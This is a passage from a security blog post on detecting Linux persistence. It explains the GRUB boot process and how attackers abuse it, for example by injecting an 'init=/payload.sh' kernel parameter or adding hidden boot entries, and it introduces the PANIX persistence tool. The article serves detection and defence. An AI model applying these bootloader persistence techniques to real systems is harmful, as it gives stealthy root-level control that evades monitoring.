<!DOCTYPE html><html lang="en"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width"/><title>Linux Detection Engineering - The Grand Finale on Linux Persistence — Elastic Security Labs</title><meta name="description" content="By the end of this series, you&#x27;ll have a robust knowledge of both common and rare Linux persistence techniques; and you&#x27;ll understand how to effectively engineer detections for common and advanced adversary capabilities."/><meta property="og:title" content="Linux Detection Engineering - The Grand Finale on Linux Persistence — Elastic Security Labs"/><meta property="og:description" content="By the end of this series, you&#x27;ll have a robust knowledge of both common and rare Linux persistence techniques; and you&#x27;ll understand how to effectively engineer detections for common and advanced adversary capabilities."/><meta property="og:image" content="https://www.elastic.co/security-labs/assets/images/the-grand-finale-on-linux-persistence/Security Labs Images 5.jpg?4d5798a3546b1804014e520113169838"/><meta property="og:image:alt" content="By the end of this series, you&#x27;ll have a robust knowledge of both common and rare Linux persistence techniques; and you&#x27;ll understand how to effectively engineer detections for common and advanced adversary capabilities."/><meta property="og:site_name"/><meta property="og:url" content="https://www.elastic.co/security-labs/the-grand-finale-on-linux-persistence"/><meta property="og:type" content="website"/><meta name="twitter:card" content="summary_large_image"/><meta name="twitter:title" content="Linux Detection Engineering - The Grand Finale on Linux Persistence — Elastic Security Labs"/><meta name="twitter:description" content="By the end of this series, you&#x27;ll have a robust knowledge of both common and rare Linux persistence techniques; and you&#x27;ll understand how to effectively engineer detections for common and advanced adversary capabilities."/><meta name="twitter:image" content="https://www.elastic.co/security-labs/assets/images/the-grand-finale-on-linux-persistence/Security Labs Images 5.jpg?4d5798a3546b1804014e520113169838"/><meta name="twitter:image:alt" content="By the end of this series, you&#x27;ll have a robust knowledge of both common and rare Linux persistence techniques; and you&#x27;ll understand how to effectively engineer detections for common and advanced adversary capabilities."/><link rel="canonical" href="https://www.elastic.co/security-labs/the-grand-finale-on-linux-persistence"/><link rel="preload" href="/security-labs/logo.svg" as="image" fetchpriority="high"/><link rel="preload" as="image" imageSrcSet="/security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fthe-grand-finale-on-linux-persistence%2FSecurity%20Labs%20Images%205.jpg&amp;w=640&amp;q=75 640w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fthe-grand-finale-on-linux-persistence%2FSecurity%20Labs%20Images%205.jpg&amp;w=750&amp;q=75 750w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fthe-grand-finale-on-linux-persistence%2FSecurity%20Labs%20Images%205.jpg&amp;w=828&amp;q=75 828w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fthe-grand-finale-on-linux-persistence%2FSecurity%20Labs%20Images%205.jpg&amp;w=1080&amp;q=75 1080w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fthe-grand-finale-on-linux-persistence%2FSecurity%20Labs%20Images%205.jpg&amp;w=1200&amp;q=75 1200w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fthe-grand-finale-on-linux-persistence%2FSecurity%20Labs%20Images%205.jpg&amp;w=1920&amp;q=75 1920w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fthe-grand-finale-on-linux-persistence%2FSecurity%20Labs%20Images%205.jpg&amp;w=2048&amp;q=75 2048w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fthe-grand-finale-on-linux-persistence%2FSecurity%20Labs%20Images%205.jpg&amp;w=3840&amp;q=75 3840w" imageSizes="100vw" fetchpriority="high"/><meta name="next-head-count" content="19"/><script src="https://play.vidyard.com/embed/v4.js" type="text/javascript" async=""></script><link rel="icon" href="/security-labs/favicon.svg"/><link rel="mask-icon" href="/security-labs/favicon.svg" color="#1C1E23"/><link rel="apple-touch-icon" href="/security-labs/favicon.svg"/><meta name="theme-color" content="#1C1E23"/><link rel="preload" href="/security-labs/_next/static/media/6d93bde91c0c2823-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><link rel="preload" href="/security-labs/_next/static/media/a34f9d1faa5f3315-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><link rel="preload" href="/security-labs/_next/static/media/369c6e283c5acc6e-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><link rel="preload" href="/security-labs/_next/static/media/92f44bb82993d879-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><link rel="preload" href="/security-labs/_next/static/media/ee71530a747ff30b-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><link rel="preload" href="/security-labs/_next/static/media/9fac010bc1f02be0-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><link rel="preload" href="/security-labs/_next/static/media/cbf5fbad4d73afac-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><script id="google-tag-manager" data-nscript="beforeInteractive">
          (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
          new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
          j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
          'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
          })(window,document,'script','dataLayer','GTM-KNJMG2M');
          </script><link rel="preload" href="/security-labs/_next/static/css/265ed7605fd03477.css" as="style"/><link rel="stylesheet" href="/security-labs/_next/static/css/265ed7605fd03477.css" data-n-g=""/><link rel="preload" href="/security-labs/_next/static/css/1007ff9e696f6f88.css" as="style"/><link rel="stylesheet" href="/security-labs/_next/static/css/1007ff9e696f6f88.css" data-n-p=""/><noscript data-n-css=""></noscript><script defer="" nomodule="" src="/security-labs/_next/static/chunks/polyfills-78c92fac7aa8fdd8.js"></script><script src="/security-labs/_next/static/chunks/webpack-7987c6fda769d510.js" defer=""></script><script src="/security-labs/_next/static/chunks/framework-7a7e500878b44665.js" defer=""></script><script src="/security-labs/_next/static/chunks/main-ebd33a9f1cae5951.js" defer=""></script><script src="/security-labs/_next/static/chunks/pages/_app-cb8664d1d3df2511.js" defer=""></script><script src="/security-labs/_next/static/chunks/fec483df-43ee602fabdfe3a4.js" defer=""></script><script src="/security-labs/_next/static/chunks/877-34f408271ef44c22.js" defer=""></script><script src="/security-labs/_next/static/chunks/511-d08fe0fdd6f8a984.js" defer=""></script><script src="/security-labs/_next/static/chunks/683-a5053c37fe5bd0c9.js" defer=""></script><script src="/security-labs/_next/static/chunks/402-e04eb76b046d3d52.js" defer=""></script><script src="/security-labs/_next/static/chunks/616-0b017b9cfa597392.js" defer=""></script><script src="/security-labs/_next/static/chunks/pages/%5Bslug%5D-b0c191de1a3710e4.js" defer=""></script><script src="/security-labs/_next/static/0ofDG0sK6QXje0tAbhpGf/_buildManifest.js" defer=""></script><script src="/security-labs/_next/static/0ofDG0sK6QXje0tAbhpGf/_ssgManifest.js" defer=""></script></head><body><noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-KNJMG2M" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript><div id="__next"><main class="__variable_0351a5 __variable_1f211e __variable_a5b5f5 flex flex-col min-h-screen"><div class="scroll-percentage-container"><div class="scroll-percentage-bar" style="width:0%"></div></div><nav class="fixed w-full z-40" data-headlessui-state=""><div class="bg-gradient-to-b from-zinc-900 from-20% h-[200%] to-transparent absolute inset-0 z-0 pointer-events-none"></div><div class="container relative z-10"><div class="flex h-16 items-center justify-between"><div class="flex items-center justify-start w-full"><div><a class="hover:opacity-50 transition" href="/security-labs"><img alt="elastic security labs logo" fetchpriority="high" width="200" height="30" decoding="async" data-nimg="1" style="color:transparent" src="/security-labs/logo.svg"/></a></div><div class="hidden lg:ml-6 lg:block"><div class="flex space-x-4"><a class="flex lg:inline-flex font-light my-1 py-1 px-2 font-display font-semibold lg:text-sm xl:text-base items-center transition hover:hover-link hover:text-white focus:accessible-link-focus" href="/security-labs/about"><span>About</span></a><div class="relative" data-headlessui-state=""><div><button class="flex lg:inline-flex font-light my-1 py-1 px-2 font-display font-semibold lg:text-sm xl:text-base items-center transition hover:hover-link hover:text-white focus:accessible-link-focus" id="headlessui-menu-button-:R2kpm:" type="button" aria-haspopup="menu" aria-expanded="false" data-headlessui-state="">Topics<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor" aria-hidden="true" class="ml-1 -mr-1 h-4 w-4 text-zinc-400 relative top-[1px]"><path fill-rule="evenodd" d="M5.23 7.21a.75.75 0 011.06.02L10 11.168l3.71-3.938a.75.75 0 111.08 1.04l-4.25 4.5a.75.75 0 01-1.08 0l-4.25-4.5a.75.75 0 01.02-1.06z" clip-rule="evenodd"></path></svg></button></div></div><a class="flex lg:inline-flex font-light my-1 py-1 px-2 font-display font-semibold lg:text-sm xl:text-base items-center transition hover:hover-link hover:text-white focus:accessible-link-focus" href="/security-labs/category/vulnerability-updates"><span>Vulnerability updates</span></a><a class="flex lg:inline-flex font-light my-1 py-1 px-2 font-display font-semibold lg:text-sm xl:text-base items-center transition hover:hover-link hover:text-white focus:accessible-link-focus" href="/security-labs/category/reports"><span>Reports</span></a><a class="flex lg:inline-flex font-light my-1 py-1 px-2 font-display font-semibold lg:text-sm xl:text-base items-center transition hover:hover-link hover:text-white focus:accessible-link-focus" href="/security-labs/category/tools"><span>Tools</span></a></div></div><div class="hidden lg:ml-auto lg:block"><div class="flex items-center space-x-4"><a class="rounded flex items-center p-4 text-white focus:outline-none focus:ring-0 focus:ring-offset-1 focus:ring-offset-zinc-600 group" href="https://search.elastic.co/?location%5B0%5D=Security%20Labs&amp;referrer=https://www.elastic.co/security-labs/the-grand-finale-on-linux-persistence"><div class="flex items-center relative font-display"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" class="h-6 w-6"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-5.197-5.197m0 0A7.5 7.5 0 105.196 5.196a7.5 7.5 0 0010.607 10.607z"></path></svg></div></a><a class="flex lg:inline-flex font-light my-1 py-1 px-2 font-display font-semibold lg:text-sm xl:text-base items-center transition hover:hover-link hover:text-white focus:accessible-link-focus" href="https://www.elastic.co/security-labs/rss/feed.xml"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor" aria-hidden="true" class="h-4 w-4 mr-1"><path d="M3.75 3a.75.75 0 00-.75.75v.5c0 .414.336.75.75.75H4c6.075 0 11 4.925 11 11v.25c0 .414.336.75.75.75h.5a.75.75 0 00.75-.75V16C17 8.82 11.18 3 4 3h-.25z"></path><path d="M3 8.75A.75.75 0 013.75 8H4a8 8 0 018 8v.25a.75.75 0 01-.75.75h-.5a.75.75 0 01-.75-.75V16a6 6 0 00-6-6h-.25A.75.75 0 013 9.25v-.5zM7 15a2 2 0 11-4 0 2 2 0 014 0z"></path></svg><span class="hidden xl:block">Subscribe</span></a><a class="font-display inline-flex items-center justify-center rounded font-semibold disabled:!select-none disabled:!bg-gray-400 bg-blue-600 text-white hover:bg-blue-500 enabled:hover:text-white/80 transition-colors px-4 py-2 text-sm flex-1 lg:flex-auto" href="https://cloud.elastic.co/registration?cta=cloud-registration&amp;tech=trial&amp;plcmt=navigation&amp;pg=security-labs">Start free trial</a><a class="font-display inline-flex items-center justify-center rounded font-semibold text-white disabled:!select-none disabled:!bg-gray-400 button px-4 py-2 text-sm flex-1 lg:flex-auto" href="https://www.elastic.co/contact">Contact sales</a></div></div></div><div class="-mr-2 flex lg:hidden"><a class="rounded flex items-center p-4 text-white focus:outline-none focus:ring-0 focus:ring-offset-1 focus:ring-offset-zinc-600 group" href="https://search.elastic.co/?location%5B0%5D=Security%20Labs&amp;referrer=https://www.elastic.co/security-labs/the-grand-finale-on-linux-persistence"><div class="flex items-center relative font-display"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" class="h-6 w-6"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-5.197-5.197m0 0A7.5 7.5 0 105.196 5.196a7.5 7.5 0 0010.607 10.607z"></path></svg></div></a><button class="inline-flex items-center justify-center rounded-md p-2 text-gray-400 hover:bg-gray-700 hover:text-white focus:outline-none focus:ring-2 focus:ring-inset focus:ring-white" id="headlessui-disclosure-button-:R59m:" type="button" aria-expanded="false" data-headlessui-state=""><span class="sr-only">Open navigation menu</span><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" class="block h-6 w-6"><path stroke-linecap="round" stroke-linejoin="round" d="M3.75 6.75h16.5M3.75 12h16.5m-16.5 5.25h16.5"></path></svg></button></div></div></div></nav><main class="mb-20 flex-1 flex flex-col"><div class="h-48 md:h-64"><div class="after:absolute after:block after:bg-blue-400 after:blur-3xl after:content-[&#x27; &#x27;] after:h-96 after:opacity-5 after:right-0 after:rounded-full after:top-20 after:w-1/2 after:z-0 before:absolute before:block before:blur-3xl before:bg-orange-400 before:content-[&#x27; &#x27;] before:h-96 before:left-0 before:opacity-5 before:rounded-full before:w-1/2 before:z-0 w-full h-full relative"><div class="relative z-10 w-full h-[125%] -top-[25%] bg-no-repeat bg-cover bg-bottom flex items-center justify-center" style="background-image:url(/security-labs/grid.svg)"></div></div></div><article class="px-4"><div class="max-w-7xl mx-auto relative z-10 flex flex-col space-y-4"><div class="eyebrow break-words"><time class="block mb-2 md:mb-0 md:inline-block article-published-date" dateTime="2025-02-27T00:00:00.000Z">27 February 2025</time><span class="hidden md:inline-block md:mx-2">•</span><a class="hover:text-blue-400 text-xs md:text-sm whitespace-nowrap author-name" href="/security-labs/author/ruben-groenewoud">Ruben Groenewoud</a></div><h1 class="font-bold leading-tighter text-3xl md:text-5xl"><span>Linux Detection Engineering -&nbsp; The Grand Finale on Linux&nbsp;Persistence</span></h1><p class="text-zinc-200 text-base md:text-xl">Building on previous research, this article describes creative, complex, or rare persistence techniques.</p><div class="flex items-center mt-4 text-zinc-200 text-sm space-x-4 border-t border-white/25 pt-4"><span class="flex items-center space-x-1"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" class="h-4 w-4 text-zinc-400"><path stroke-linecap="round" stroke-linejoin="round" d="M12 6v6h4.5m4.5 0a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg><span>48 min read</span></span><span class="flex items-center space-x-1"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" class="h-4 w-4 text-zinc-400"><path stroke-linecap="round" stroke-linejoin="round" d="M9.568 3H5.25A2.25 2.25 0 003 5.25v4.318c0 .597.237 1.17.659 1.591l9.581 9.581c.699.699 1.78.872 2.607.33a18.095 18.095 0 005.223-5.223c.542-.827.369-1.908-.33-2.607L11.16 3.66A2.25 2.25 0 009.568 3z"></path><path stroke-linecap="round" stroke-linejoin="round" d="M6 6h.008v.008H6V6z"></path></svg><span><a class="hover:text-blue-400 whitespace-nowrap" href="/security-labs/category/security-research">Security research</a></span></span></div></div><div class="max-w-7xl mx-auto"><div class="bg-zinc-900 border border-zinc-800 drop-shadow-lg p-5 sm:p-8 md:p-10 rounded-3xl mt-5 md:mt-10"><div class="relative w-full rounded-lg overflow-hidden aspect-video"><img alt="Linux Detection Engineering - The Grand Finale on Linux Persistence" fetchpriority="high" decoding="async" data-nimg="fill" class="object-cover absolute h-full w-full" style="position:absolute;height:100%;width:100%;left:0;top:0;right:0;bottom:0;color:transparent" sizes="100vw" srcSet="/security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fthe-grand-finale-on-linux-persistence%2FSecurity%20Labs%20Images%205.jpg&amp;w=640&amp;q=75 640w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fthe-grand-finale-on-linux-persistence%2FSecurity%20Labs%20Images%205.jpg&amp;w=750&amp;q=75 750w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fthe-grand-finale-on-linux-persistence%2FSecurity%20Labs%20Images%205.jpg&amp;w=828&amp;q=75 828w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fthe-grand-finale-on-linux-persistence%2FSecurity%20Labs%20Images%205.jpg&amp;w=1080&amp;q=75 1080w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fthe-grand-finale-on-linux-persistence%2FSecurity%20Labs%20Images%205.jpg&amp;w=1200&amp;q=75 1200w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fthe-grand-finale-on-linux-persistence%2FSecurity%20Labs%20Images%205.jpg&amp;w=1920&amp;q=75 1920w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fthe-grand-finale-on-linux-persistence%2FSecurity%20Labs%20Images%205.jpg&amp;w=2048&amp;q=75 2048w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fthe-grand-finale-on-linux-persistence%2FSecurity%20Labs%20Images%205.jpg&amp;w=3840&amp;q=75 3840w" src="/security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fthe-grand-finale-on-linux-persistence%2FSecurity%20Labs%20Images%205.jpg&amp;w=3840&amp;q=75"/><div class="absolute border border-white/50 inset-0 mix-blend-overlay rounded-lg z-10"></div></div></div></div><div class="lg:max-w-7xl mx-auto relative mt-12"><div class="flex justify-center"><div class="prose lg:prose-lg prose-invert w-full article-content"><div><h1 class="font-bold leading-tighter text-3xl md:text-5xl relative"><span id="introduction" class="absolute -top-32"></span>Introduction</h1>
<p>Welcome to the grand finale of the “Linux Persistence Detection Engineering” series! In this fifth and final part, we continue to dig deep into the world of Linux persistence. Building on the foundational concepts and techniques explored in the previous publications, this post discusses some more obscure, creative and/or complex backdoors and persistence mechanisms.</p>
<p>If you missed the earlier articles, they lay the groundwork by exploring key persistence concepts. You can catch up on them here:</p>
<ul>
<li><a href="https://www.elastic.co/security-labs/primer-on-persistence-mechanisms"><em>Linux Detection Engineering - A Primer on Persistence Mechanisms</em></a></li>
<li><a href="https://www.elastic.co/security-labs/sequel-on-persistence-mechanisms"><em>Linux Detection Engineering - A Sequel on Persistence Mechanisms</em></a></li>
<li><a href="https://www.elastic.co/security-labs/continuation-on-persistence-mechanisms"><em>Linux Detection Engineering - A Continuation on Persistence Mechanisms</em></a></li>
<li><a href="https://www.elastic.co/security-labs/approaching-the-summit-on-persistence"><em>Linux Detection Engineering - Approaching the Summit on Persistence Mechanisms</em></a></li>
</ul>
<p>In this publication, we’ll provide insights into these persistence mechanisms by showcasing:</p>
<ul>
<li>How each works (theory)</li>
<li>How to set each up (practice)</li>
<li>How to detect them (SIEM and Endpoint rules)</li>
<li>How to hunt for them (ES|QL and OSQuery reference hunts)</li>
</ul>
<p>To make the process even more engaging, we will be leveraging <a href="https://github.com/Aegrah/PANIX">PANIX</a>, a custom-built Linux persistence tool designed by Ruben Groenewoud of Elastic Security. PANIX allows you to streamline and experiment with Linux persistence setups, making it easy to identify and test detection opportunities.</p>
<p>By the end of this series, you&#x27;ll have a robust knowledge of both common and rare Linux persistence techniques; and you&#x27;ll understand how to effectively engineer detections for common and advanced adversary capabilities. Are you ready to uncover the final pieces of the Linux persistence puzzle? Let’s dive in!</p>
<h1 class="font-bold leading-tighter text-3xl md:text-5xl relative"><span id="setup-note" class="absolute -top-32"></span>Setup note</h1>
<p>To ensure you are prepared to detect the persistence mechanisms discussed in this article, it is important to <a href="https://www.elastic.co/guide/en/security/current/prebuilt-rules-management.html#update-prebuilt-rules">enable and update our pre-built detection rules</a>. If you are working with a custom-built ruleset and do not use all of our pre-built rules, this is a great opportunity to test them and potentially fill any gaps. Now, we are ready to get started.</p>
<h1 class="font-bold leading-tighter text-3xl md:text-5xl relative"><span id="t1542---pre-os-boot-grub-bootloader" class="absolute -top-32"></span>T1542 - Pre-OS Boot: GRUB Bootloader</h1>
<p><a href="https://www.gnu.org/software/grub/manual/grub/grub.html">GRUB (GRand Unified Bootloader)</a> is a widely used bootloader in Linux systems, responsible for loading the kernel and initializing the operating system. GRUB provides a flexible framework that supports various configurations, making it a powerful tool for managing the boot process. It acts as an intermediary between the system firmware (<a href="https://en.wikipedia.org/wiki/BIOS">BIOS</a>/<a href="https://en.wikipedia.org/wiki/UEFI">UEFI</a>) and the operating system. When a Linux system is powered on, the following sequence typically occurs:</p>
<ol>
<li>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="system-firmware" class="absolute -top-32"></span><strong>System Firmware</strong></h3>
</li>
</ol>
<ul>
<li>BIOS or UEFI initializes hardware components (e.g., CPU, RAM, storage devices) and performs a POST (Power-On Self-Test).</li>
<li>It then locates the bootloader on the designated boot device (usually based on boot priority settings).</li>
</ul>
<ol start="2">
<li>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="grub-bootloader" class="absolute -top-32"></span><strong>GRUB Bootloader</strong></h3>
</li>
</ol>
<ul>
<li>GRUB is loaded into memory.</li>
<li>It displays a menu (if enabled) that allows users to select an operating system, kernel version, or recovery mode.</li>
<li>GRUB loads the kernel image (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">vmlinuz</code>) into memory, as well as the initramfs/initrd image (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">initrd.img</code>), which is a temporary root filesystem used for initial system setup (e.g., loading kernel modules for filesystems and hardware).</li>
<li>GRUB passes kernel parameters (e.g., the location of the root filesystem, boot options) and hands over control to the kernel.</li>
</ul>
<ol start="3">
<li>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="kernel-execution" class="absolute -top-32"></span><strong>Kernel Execution</strong></h3>
</li>
</ol>
<ul>
<li>The kernel is unpacked and initialized. It begins detecting and initializing system hardware.</li>
<li>The kernel mounts the root filesystem specified in the kernel parameters.</li>
<li>It starts the init system (traditionally <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">init</code>, now often <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">systemd</code>), which is the first process (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">PID 1</code>) that initializes and manages the user space.</li>
<li>The <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">init</code> system sets up services, mounts filesystems, and spawns user sessions.</li>
</ul>
<p>GRUB’s configuration system is flexible and modular, enabling administrators to define bootloader behavior, kernel parameters, and menu entries. All major distributions use <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/default/grub</code> as the primary configuration file for GRUB. This file contains high-level options, such as default kernel parameters, boot timeout, and graphical settings. For example:</p>
<pre><code>GRUB_TIMEOUT=5                       # Timeout in seconds for the GRUB menu
GRUB_DEFAULT=0                       # Default menu entry to boot
GRUB_CMDLINE_LINUX_DEFAULT=&quot;quiet splash resume=/dev/sda2&quot; # Common kernel parameters
GRUB_CMDLINE_LINUX=&quot;init=/bin/bash audit=1&quot; # Additional kernel parameters</code></pre>
<p>To enhance flexibility, GRUB supports a modular approach to configuration through script directories. These are typically located in <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/default/grub.d/</code> (Ubuntu/Debian) and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/grub.d/</code> (Fedora/CentOS/RHEL). The scripts in these directories are combined into the final configuration during the update process.</p>
<p>Prior to boot, the GRUB bootloader must be compiled. The compiled GRUB configuration file is the final output used by the bootloader at runtime. It is generated from the settings in <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/default/grub</code> and the modular scripts in <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/grub.d/</code> (or similar directories and files for other distributions). This configuration is then stored in <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/boot/grub/grub.cfg</code> for BIOS systems, and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/boot/efi/EFI/&lt;distro&gt;/grub.cfg</code> for UEFI systems.</p>
<p>On Ubuntu and Debian-based systems, the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">update-grub</code> command is used to generate the GRUB configuration. For Fedora, CentOS, and RHEL systems, the equivalent command is <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">grub2-mkconfig</code>. Upon generation of the configuration, the following events occur:</p>
<ol>
<li><strong>Scripts Execution</strong>:</li>
</ol>
<ul>
<li>All modular scripts in <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/default/grub.d/</code> or <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/grub.d/</code> are executed in numerical order.</li>
</ul>
<ol start="2">
<li><strong>Settings Aggregation</strong>:</li>
</ol>
<ul>
<li>Parameters from <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/default/grub</code> and modular scripts are merged.</li>
</ul>
<ol start="3">
<li><strong>Menu Entries Creation</strong>:</li>
</ol>
<ul>
<li>GRUB dynamically detects installed kernels and operating systems and creates corresponding menu entries.</li>
</ul>
<ol start="4">
<li><strong>Final Compilation</strong>:</li>
</ol>
<ul>
<li>The combined configuration is written to <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/boot/grub/grub.cfg</code> (or the UEFI equivalent path), ready to be used at the next boot.</li>
</ul>
<p>Attackers can exploit GRUB’s flexibility and early execution in the boot process to establish persistence. By modifying GRUB configuration files, they can inject malicious parameters or scripts that execute with root privileges before the operating system fully initializes. Attackers can:</p>
<ol>
<li><strong>Inject Malicious Kernel Parameters</strong>:</li>
</ol>
<ul>
<li>Adding parameters like <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">init=/payload.sh</code> in <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/default/grub</code> or directly in the GRUB menu at boot forces the kernel to execute a malicious script instead of the default <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">init</code> system.</li>
</ul>
<ol start="2">
<li><strong>Modify Menu Entries</strong>:</li>
</ol>
<ul>
<li>Attackers can alter menu entries in <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/grub.d/</code> to include unauthorized commands or point to malicious kernels.</li>
</ul>
<ol start="3">
<li><strong>Create Hidden Boot Entries</strong>:</li>
</ol>
<ul>
<li>Adding extra boot entries with malicious configurations that are not displayed in the GRUB menu.</li>
</ul>
<p>As GRUB operates before the system’s typical EDR and other solution mechanisms are active, this technique is especially hard to detect. Additionally, knowledge scarcity around these types of attacks makes detection difficult, as malicious parameters or entries can appear similar to legitimate configurations, making manual inspection prone to oversight.</p>
<p>GRUB manipulation falls under <a href="https://attack.mitre.org/techniques/T1542/">T1542: Pre-OS Boot</a> in the MITRE ATT&amp;CK framework. This technique encompasses attacks targeting bootloaders to gain control before the operating system initializes. Despite its significance, there is currently no dedicated sub-technique for GRUB-specific attacks.</p>
<p>In the next section, we’ll explore how attackers can establish persistence through GRUB by injecting malicious parameters and modifying bootloader configurations.</p>
<h1 class="font-bold leading-tighter text-3xl md:text-5xl relative"><span id="persistence-through-t1542---pre-os-boot-grub-bootloader" class="absolute -top-32"></span>Persistence through T1542 - Pre-OS Boot: GRUB Bootloader</h1>
<p>In this section we will be looking at the technical details related to GRUB persistence. To accomplish this, we will be leveraging the <a href="https://github.com/Aegrah/PANIX/blob/7e27768807e12d11932e2fca5b6a4867308295dd/modules/setup_grub.sh">setup_grub.sh</a> module from <a href="https://github.com/Aegrah/PANIX">PANIX</a>, a custom-built Linux persistence tool. By simulating this technique, we will be able to research potential detection opportunities.</p>
